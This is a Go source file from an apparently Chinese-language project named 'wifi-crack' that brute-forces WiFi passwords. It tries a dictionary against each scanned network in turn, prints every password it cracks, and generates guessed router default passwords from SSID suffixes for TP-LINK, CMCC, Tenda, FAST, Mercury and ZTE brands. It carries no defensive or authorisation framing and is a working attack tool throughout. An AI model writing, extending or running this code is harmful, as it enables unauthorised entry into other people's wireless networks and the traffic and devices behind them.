package cracker

import (
	"fmt"
	"strings"
	"time"
	"wifi-crack/internal/scanner"
)

// ============================================================
// CrackResult 单个WiFi的爆破结果
// ============================================================
type CrackResult struct {
	SSID     string // 网络名称
	BSSID    string // MAC地址
	Password string // 破解到的密码（空=未破解）
	Tried    int    // 尝试次数
	Duration time.Duration
	Success  bool
}

// ============================================================
// CrackConfig 爆破配置
// ============================================================
type CrackConfig struct {
	Delay    time.Duration // 每次尝试间隔
	Verbose  bool          // 是否显示详细日志
	MaxRetry int           // 单个密码最大重试次数
}

// ============================================================
// DefaultConfig 默认配置
// ============================================================
func DefaultConfig() CrackConfig {
	return CrackConfig{
		Delay:    500 * time.Millisecond,
		Verbose:  true,
		MaxRetry: 1,
	}
}

// ============================================================
// CrackOne 爆破单个WiFi
// 按顺序尝试密码列表，成功则立即返回
// ============================================================
func CrackOne(net scanner.WiFiNetwork, passwords []string, cfg CrackConfig) CrackResult {
	start := time.Now()
	result := CrackResult{
		SSID:  net.SSID,
		BSSID: net.BSSID,
	}

	total := len(passwords)
	for i, pwd := range passwords {
		result.Tried = i + 1

		if cfg.Verbose {
			// 进度条样式输出
			fmt.Printf("\r  [%d/%d] %-24s 尝试: %-20s",
				i+1, total, net.SSID, maskPassword(pwd))
		}

		// 尝试连接
		ok := scanner.TryConnect(net.SSID, pwd)
		if ok {
			result.Password = pwd
			result.Success = true
			result.Duration = time.Since(start)

			if cfg.Verbose {
				fmt.Printf("\r  [%d/%d] %-24s ✓ 密码: %s\n",
					i+1, total, net.SSID, pwd)
			}

			// 断开连接（准备爆破下一个）
			scanner.DisconnectWiFi()
			time.Sleep(300 * time.Millisecond)
			return result
		}

		// 尝试间隔
		if cfg.Delay > 0 && i < total-1 {
			time.Sleep(cfg.Delay)
		}
	}

	result.Duration = time.Since(start)
	if cfg.Verbose {
		fmt.Printf("\r  [%d/%d] %-24s ✗ 未破解 (耗时 %s)\n",
			total, total, net.SSID, result.Duration.Round(time.Second))
	}

	return result
}

// ============================================================
// CrackAll 批量爆破所有目标WiFi
// ============================================================
func CrackAll(targets []scanner.WiFiNetwork, passwords []string, cfg CrackConfig) []CrackResult {
	results := make([]CrackResult, 0, len(targets))

	fmt.Printf("\n  ╔══════════════════════════════════════════╗\n")
	fmt.Printf("  ║   WiFi 爆破引擎 v1.0 (Go)               ║\n")
	fmt.Printf("  ║   目标: %d 个 | 字典: %d 条              ║\n", len(targets), len(passwords))
	fmt.Printf("  ╚══════════════════════════════════════════╝\n\n")

	successCount := 0
	for i, net := range targets {
		fmt.Printf("  ── 目标 [%d/%d] %s (信号:%d dBm 安全:%s) ──\n",
			i+1, len(targets), net.SSID, net.RSSI, net.Security)

		result := CrackOne(net, passwords, cfg)
		results = append(results, result)

		if result.Success {
			successCount++
		}
		fmt.Println()
	}

	// 打印汇总报告
	printReport(results, successCount)
	return results
}

// ============================================================
// GenerateRouterDefaults 根据SSID生成路由器默认密码
// 支持: TP-LINK, CMCC, Tenda, FAST, MERCURY, 中兴 等
// ============================================================
func GenerateRouterDefaults(ssid string) []string {
	upper := strings.ToUpper(ssid)
	var defaults []string

	switch {
	// TP-LINK: 通常后4位或后6位作为默认密码的一部分
	case strings.HasPrefix(upper, "TP-LINK") || strings.HasPrefix(upper, "TP_LINK"):
		suffix := extractSuffix(ssid, 4)
		if suffix != "" {
			defaults = append(defaults,
				"1234567890",
				suffix+suffix,       // 4位重复
				"TP"+suffix+"TP",    // TP包裹
				"admin"+suffix,      // admin前缀
				"tp"+suffix,         // tp前缀
			)
		}

	// CMCC（移动）: 通常是后3-4位数字组合
	case strings.HasPrefix(upper, "CMCC"):
		suffix := extractSuffix(ssid, 3)
		if suffix != "" {
			defaults = append(defaults,
				suffix+suffix+suffix,                   // 3位重复3次
				"1"+strings.Repeat(suffix, 2)+"1",      // 1xxx1格式
				"cmcc"+suffix,
			)
		}

	// Tenda: 通常默认密码较简单
	case strings.HasPrefix(upper, "TENDA"):
		suffix := extractSuffix(ssid, 4)
		if suffix != "" {
			defaults = append(defaults,
				suffix+suffix,
				"tenda"+suffix,
			)
		}

	// FAST: 同TP-LINK系列
	case strings.HasPrefix(upper, "FAST"):
		suffix := extractSuffix(ssid, 4)
		if suffix != "" {
			defaults = append(defaults,
				suffix+suffix,
				"fast"+suffix,
			)
		}

	// MERCURY（水星）
	case strings.HasPrefix(upper, "MERCURY") || strings.HasPrefix(upper, "MERC"):
		suffix := extractSuffix(ssid, 4)
		if suffix != "" {
			defaults = append(defaults,
				suffix+suffix,
				"merc"+suffix,
			)
		}

	// 中兴
	case strings.HasPrefix(upper, "ZTE") || strings.HasPrefix(upper, "中兴"):
		suffix := extractSuffix(ssid, 4)
		if suffix != "" {
			defaults = append(defaults,
				suffix+suffix,
				"zte"+suffix,
			)
		}
	}

	// 通用默认密码
	defaults = append(defaults,
		"12345678",
		"88888888",
		"00000000",
		"11111111",
		"66666666",
		"123456789",
		"1234567890",
		"0123456789",
		"87654321",
		"password",
		"admin123",
		"admin888",
		"12341234",
		"11112222",
	)

	return dedupStrings(defaults)
}

// ============================================================
// 内部辅助函数
// ============================================================

// extractSuffix 从SSID中提取末尾N个字符（通常是hex或数字）
func extractSuffix(ssid string, n int) string {
	if len(ssid) < n {
		return ""
	}
	suffix := ssid[len(ssid)-n:]
	// 只保留字母数字
	clean := strings.Map(func(r rune) rune {
		if (r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F') {
			return r
		}
		return -1
	}, suffix)
	if len(clean) >= n {
		return strings.ToLower(clean[:n])
	}
	return ""
}

// maskPassword 显示密码时部分掩码
func maskPassword(pwd string) string {
	if len(pwd) <= 4 {
		return pwd
	}
	return pwd[:2] + "***" + pwd[len(pwd)-2:]
}

// dedupStrings 字符串去重（保持顺序）
func dedupStrings(ss []string) []string {
	seen := make(map[string]bool, len(ss))
	out := make([]string, 0, len(ss))
	for _, s := range ss {
		if !seen[s] {
			seen[s] = true
			out = append(out, s)
		}
	}
	return out
}

// printReport 打印爆破汇总报告
func printReport(results []CrackResult, successCount int) {
	fmt.Println("  ╔══════════════════════════════════════════╗")
	fmt.Println("  ║              爆 破 报 告                 ║")
	fmt.Println("  ╠══════════════════════════════════════════╣")
	fmt.Printf("  ║  总目标: %-5d  成功: %-5d  失败: %-5d  ║\n",
		len(results), successCount, len(results)-successCount)
	fmt.Println("  ╠══════════════════════════════════════════╣")

	for _, r := range results {
		if r.Success {
			fmt.Printf("  ║  ✓ %-20s → %s\n", r.SSID, r.Password)
		} else {
			fmt.Printf("  ║  ✗ %-20s   (尝试%d次)\n", r.SSID, r.Tried)
		}
	}
	fmt.Println("  ╚══════════════════════════════════════════╝")
}
